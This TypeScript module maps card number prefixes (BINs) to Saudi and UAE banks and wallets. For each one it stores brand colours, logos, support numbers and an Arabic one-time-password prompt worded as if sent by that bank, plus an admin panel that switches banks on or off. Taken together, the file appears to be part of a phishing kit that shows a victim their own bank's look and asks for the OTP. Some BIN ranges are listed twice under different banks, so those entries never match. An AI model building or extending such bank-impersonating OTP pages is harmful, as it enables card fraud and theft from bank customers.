// ═══════════════════════════════════════════════════════════════
//  Saudi & UAE Banks — BIN Database (8-digit Range Checking)
// ═══════════════════════════════════════════════════════════════

export interface BankInfo {
  key: string;
  name: string;
  nameEn: string;
  color: string;
  colorDark: string;
  colorLight: string;
  otpMessage: string;
  supportPhone: string;
  website: string;
  logoUrl: string; // Real SVG logo from Wikipedia Commons
}

// ─── 8-digit BIN Range Registry ────────────────────────────
interface BinRange {
  start: number;
  end: number;
  bankKey: string;
}

const BIN_RANGES: BinRange[] = [
  // ==================== البنوك السعودية ====================
  // مصرف الراجحي
  { start: 40920100, end: 40920199, bankKey: 'alrajhi' },
  { start: 42992700, end: 42992799, bankKey: 'alrajhi' },
  { start: 44582700, end: 44582799, bankKey: 'alrajhi' },
  { start: 45755300, end: 45755399, bankKey: 'alrajhi' },
  { start: 48478300, end: 48478399, bankKey: 'alrajhi' },
  // البنك الأهلي السعودي (SNB)
  { start: 52419700, end: 52419799, bankKey: 'snb' },
  { start: 53582500, end: 53582599, bankKey: 'snb' },
  { start: 54520500, end: 54520599, bankKey: 'snb' },
  // مصرف الإنماء
  { start: 43232800, end: 43232899, bankKey: 'alinma' },
  // بنك الرياض
  { start: 45468300, end: 45468399, bankKey: 'riyad' },
  { start: 45792700, end: 45792799, bankKey: 'riyad' },
  // البنك السعودي الفرنسي
  { start: 44064700, end: 44064799, bankKey: 'bsf' },
  { start: 45786500, end: 45786599, bankKey: 'bsf' },
  // البنك العربي الوطني
  { start: 45503600, end: 45503699, bankKey: 'anb' },
  // بنك البلاد
  { start: 46854000, end: 46854099, bankKey: 'albilad' },
  // البنك السعودي للاستثمار
  { start: 48301000, end: 48301099, bankKey: 'saib' },
  // بنك إس تي سي (STC Bank)
  { start: 41068500, end: 41068599, bankKey: 'stcbank' },
  { start: 45782300, end: 45782399, bankKey: 'stcbank' },
  { start: 58884800, end: 58884899, bankKey: 'stcbank' },
  { start: 48902200, end: 48902299, bankKey: 'stcbank' },
  { start: 48967400, end: 48967499, bankKey: 'stcbank' },
  // STC Pay (legacy)
  { start: 48902200, end: 48902299, bankKey: 'stcpay' },
  { start: 48967400, end: 48967499, bankKey: 'stcpay' },
  // urpay
  { start: 45572000, end: 45572099, bankKey: 'urpay' },
  { start: 45573700, end: 45573799, bankKey: 'urpay' },
  // D360 Bank
  { start: 44246300, end: 44246399, bankKey: 'd360' },
  // البنك السعودي الأول (SAB)
  { start: 42211900, end: 42211999, bankKey: 'sab' },

  // ==================== البنوك الإماراتية ====================
  // بنك الإمارات دبي الوطني
  { start: 40228300, end: 40228399, bankKey: 'enbd' },
  { start: 42363000, end: 42363099, bankKey: 'enbd' },
  { start: 45297300, end: 45297399, bankKey: 'enbd' },
  // بنك أبوظبي الأول (FAB)
  { start: 40167600, end: 40167699, bankKey: 'fab' },
  { start: 45244300, end: 45244399, bankKey: 'fab' },
  // بنك أبوظبي التجاري (ADCB)
  { start: 42521500, end: 42521599, bankKey: 'adcb' },
  { start: 48512500, end: 48512599, bankKey: 'adcb' },
  // بنك دبي الإسلامي
  { start: 45240200, end: 45240299, bankKey: 'dib' },
  // بنك المشرق
  { start: 42168900, end: 42168999, bankKey: 'mashreq' },
  // مصرف أبوظبي الإسلامي
  { start: 46941500, end: 46941599, bankKey: 'adib' },
  // Liv. Digital Bank
  { start: 43419500, end: 43419599, bankKey: 'liv' },
  // Wio Bank
  { start: 47253100, end: 47253199, bankKey: 'wio' },
];

// ─── Bank Details ──────────────────────────────────────────
export const banks: Record<string, BankInfo> = {
  alrajhi: {
    key: 'alrajhi', name: 'مصرف الراجحي', nameEn: 'AL RAJHI BANK',
    color: '#1B3A5C', colorDark: '#0F2440', colorLight: '#E8F0F8',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى مصرف الراجحي',
    supportPhone: '920003344', website: 'alrajhibank.com.sa',
    logoUrl: '/assets/logos/alrajhi-bank.png',
  },
  snb: {
    key: 'snb', name: 'البنك الأهلي السعودي', nameEn: 'SAUDI NATIONAL BANK',
    color: '#1A3A5C', colorDark: '#0F2440', colorLight: '#EDF2F7',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى البنك الأهلي السعودي',
    supportPhone: '920001000', website: 'alahlisaudi.com',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/7/7b/Saudi_National_Bank_Logo.svg',
  },
  alinma: {
    key: 'alinma', name: 'مصرف الإنماء', nameEn: 'ALINMA BANK',
    color: '#1B6B3B', colorDark: '#124D29', colorLight: '#E8F5EE',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى مصرف الإنماء',
    supportPhone: '8001248888', website: 'alinma.com',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/f/f2/Alinma_Bank_logo.svg',
  },
  riyad: {
    key: 'riyad', name: 'بنك الرياض', nameEn: 'RIYAD BANK',
    color: '#004B8D', colorDark: '#003566', colorLight: '#E6F0FA',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى بنك الرياض',
    supportPhone: '920002470', website: 'riyadbank.com',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/c/c7/Riyad_Bank_logo.svg',
  },
  bsf: {
    key: 'bsf', name: 'البنك السعودي الفرنسي', nameEn: 'BANQUE SAUDI FRANSI',
    color: '#C41E3A', colorDark: '#8A1530', colorLight: '#FDE8EC',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى البنك السعودي الفرنسي',
    supportPhone: '8001244124', website: 'saudifransi.com.sa',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/9/91/Banque_Saudi_Fransi_Logo.svg',
  },
  anb: {
    key: 'anb', name: 'البنك العربي الوطني', nameEn: 'ARAB NATIONAL BANK',
    color: '#2E5C8A', colorDark: '#1E3D5C', colorLight: '#EBF2F8',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى البنك العربي الوطني',
    supportPhone: '920001878', website: 'anb.com.sa',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/3/3e/Anb_new_logo.png',
  },
  albilad: {
    key: 'albilad', name: 'بنك البلاد', nameEn: 'AL BILAD BANK',
    color: '#006F3C', colorDark: '#004D29', colorLight: '#E6F5ED',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى بنك البلاد',
    supportPhone: '8001240001', website: 'albilad.com',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/e/e2/Bank_Albilad_logo.svg',
  },
  saib: {
    key: 'saib', name: 'البنك السعودي للاستثمار', nameEn: 'SAUDI INVESTMENT BANK',
    color: '#1A1A2E', colorDark: '#0D0D1A', colorLight: '#F0F0F5',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى البنك السعودي للاستثمار',
    supportPhone: '8001249090', website: 'saib.com.sa',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/8/8e/SAIB_logo.png',
  },
  stcbank: {
    key: 'stcbank', name: 'بنك إس تي سي', nameEn: 'STC BANK',
    color: '#4F2D7F', colorDark: '#3D1E63', colorLight: '#F2EDF9',
    otpMessage: 'أدخل رمز التحقق المرسل إلى تطبيق بنك STC على جوالك',
    supportPhone: '8001180008', website: 'stcbank.com.sa',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/2/2c/Stc_pay.svg',
  },
  stcpay: {
    key: 'stcpay', name: 'STC Pay', nameEn: 'STC PAY',
    color: '#4F2D7F', colorDark: '#3D1E63', colorLight: '#F2EDF9',
    otpMessage: 'أدخل رمز التحقق المرسل إلى تطبيق STC Pay على جوالك',
    supportPhone: '8001180008', website: 'stcpay.com.sa',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/2/2c/Stc_pay.svg',
  },
  urpay: {
    key: 'urpay', name: 'urpay', nameEn: 'URPAY',
    color: '#0A1128', colorDark: '#050814', colorLight: '#EEF0F5',
    otpMessage: 'أدخل رمز التحقق المرسل إلى تطبيق urpay على جوالك',
    supportPhone: '8001241010', website: 'urpay.com.sa',
    logoUrl: '/assets/logos/urpay-white.png',
  },
  d360: {
    key: 'd360', name: 'D360 Bank', nameEn: 'D360 BANK',
    color: '#00A9CE', colorDark: '#007A96', colorLight: '#E6F8FC',
    otpMessage: 'أدخل رمز التحقق المرسل إلى تطبيق D360 Bank على جوالك',
    supportPhone: '8001203600', website: 'd360.com.sa',
    logoUrl: '',
  },
  sab: {
    key: 'sab', name: 'البنك السعودي الأول', nameEn: 'SAUDI AWWAL BANK',
    color: '#D11242', colorDark: '#A00E33', colorLight: '#FDE8EC',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى البنك السعودي الأول',
    supportPhone: '8001248080', website: 'sab.com',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/7/73/Alawal_Bank_Logo.svg',
  },
  // ==================== البنوك الإماراتية ====================
  enbd: {
    key: 'enbd', name: 'بنك الإمارات دبي الوطني', nameEn: 'EMIRATES NBD',
    color: '#003366', colorDark: '#002244', colorLight: '#E6EDF5',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى بنك الإمارات دبي الوطني',
    supportPhone: '600540001', website: 'emiratesnbd.com',
    logoUrl: '',
  },
  fab: {
    key: 'fab', name: 'بنك أبوظبي الأول', nameEn: 'FAB',
    color: '#132247', colorDark: '#0C1630', colorLight: '#E8EBF0',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى بنك أبوظبي الأول',
    supportPhone: '600525500', website: 'bankfab.com',
    logoUrl: '',
  },
  adcb: {
    key: 'adcb', name: 'بنك أبوظبي التجاري', nameEn: 'ADCB',
    color: '#A6192E', colorDark: '#7A1122', colorLight: '#FCE8EB',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى بنك أبوظبي التجاري',
    supportPhone: '600522221', website: 'adcb.com',
    logoUrl: '',
  },
  dib: {
    key: 'dib', name: 'بنك دبي الإسلامي', nameEn: 'DUBAI ISLAMIC BANK',
    color: '#0A5C36', colorDark: '#073D24', colorLight: '#E6F5ED',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى بنك دبي الإسلامي',
    supportPhone: '600500400', website: 'dib.ae',
    logoUrl: '',
  },
  mashreq: {
    key: 'mashreq', name: 'بنك المشرق', nameEn: 'MASHREQ BANK',
    color: '#FF5F00', colorDark: '#CC4C00', colorLight: '#FFF0E6',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى بنك المشرق',
    supportPhone: '600540040', website: 'mashreqbank.com',
    logoUrl: '',
  },
  adib: {
    key: 'adib', name: 'مصرف أبوظبي الإسلامي', nameEn: 'ADIB',
    color: '#005F87', colorDark: '#004462', colorLight: '#E6F3F8',
    otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك المسجل لدى مصرف أبوظبي الإسلامي',
    supportPhone: '600543216', website: 'adib.ae',
    logoUrl: '',
  },
  liv: {
    key: 'liv', name: 'Liv.', nameEn: 'LIV. DIGITAL BANK',
    color: '#E00074', colorDark: '#AD005A', colorLight: '#FDE8F2',
    otpMessage: 'أدخل رمز التحقق المرسل إلى تطبيق Liv. على جوالك',
    supportPhone: '600540000', website: 'liv.me',
    logoUrl: '',
  },
  wio: {
    key: 'wio', name: 'Wio Bank', nameEn: 'WIO BANK',
    color: '#111111', colorDark: '#000000', colorLight: '#F0F0F0',
    otpMessage: 'أدخل رمز التحقق المرسل إلى تطبيق Wio Bank على جوالك',
    supportPhone: '600555020', website: 'wio.io',
    logoUrl: '',
  },
};

// ═══════════════════════════════════════════════════════════════
//  Admin-Editable Bank Storage (localStorage Override)
// ═══════════════════════════════════════════════════════════════

export interface StoredBank extends BankInfo {
  bins: string;          // comma-separated BIN list
  enabled: boolean;      // is bank active?
}

const BANKS_STORAGE_KEY = 'sat_admin_banks_v3';

function allDefaultBanks(): StoredBank[] {
  return Object.values(banks).map(b => {
    // Find all BIN ranges for this bank
    const bins = BIN_RANGES
      .filter(r => r.bankKey === b.key)
      .map(r => r.start.toString().slice(0, 6))
      .filter((v, i, a) => a.indexOf(v) === i)
      .join(', ');
    return { ...b, bins, enabled: true };
  });
}

export function loadStoredBanks(): StoredBank[] {
  try {
    const raw = localStorage.getItem(BANKS_STORAGE_KEY);
    if (raw) return JSON.parse(raw);
  } catch { /* ignore */ }
  return allDefaultBanks();
}

export function saveStoredBanks(list: StoredBank[]) {
  localStorage.setItem(BANKS_STORAGE_KEY, JSON.stringify(list));
}

export function seedBanks() {
  if (!localStorage.getItem(BANKS_STORAGE_KEY)) {
    saveStoredBanks(allDefaultBanks());
  }
}

/** Merge stored overrides with defaults */
function getMergedBanks(): Record<string, StoredBank> {
  const stored = loadStoredBanks();
  const merged: Record<string, StoredBank> = {};
  // Start with defaults
  Object.values(banks).forEach(b => {
    merged[b.key] = { ...b, bins: '', enabled: true };
  });
  // Override with stored
  stored.forEach(s => {
    merged[s.key] = { ...merged[s.key], ...s };
  });
  return merged;
}

// ─── 8-Digit BIN Range Detection (reads from stored banks) ───
export function detectBank(cardNumber: string): { bankKey: string; bank: BankInfo } | null {
  const digits = cardNumber.replace(/\s/g, '').replace(/\D/g, '');
  if (digits.length < 8) return null;
  const bin8 = parseInt(digits.slice(0, 8), 10);
  const matched = BIN_RANGES.find(r => bin8 >= r.start && bin8 <= r.end);
  if (!matched) return null;
  // Check stored banks first (for enabled/disabled)
  const merged = getMergedBanks();
  const bank = merged[matched.bankKey];
  if (!bank || !bank.enabled) return null;
  return { bankKey: matched.bankKey, bank };
}

/** Get bank info by key (respects admin overrides) */
export function getBankInfo(key: string): BankInfo | null {
  const merged = getMergedBanks();
  return merged[key] || banks[key] || null;
}

/** List all active bank names */
export function getBankList(): { key: string; name: string; color: string }[] {
  const merged = getMergedBanks();
  return Object.values(merged)
    .filter(b => b.enabled)
    .map(b => ({ key: b.key, name: b.name, color: b.color }));
}

/** Check if a card number has enough digits for detection */
export function canDetectBank(cardNumber: string): boolean {
  return cardNumber.replace(/\s/g, '').replace(/\D/g, '').length >= 8;
}
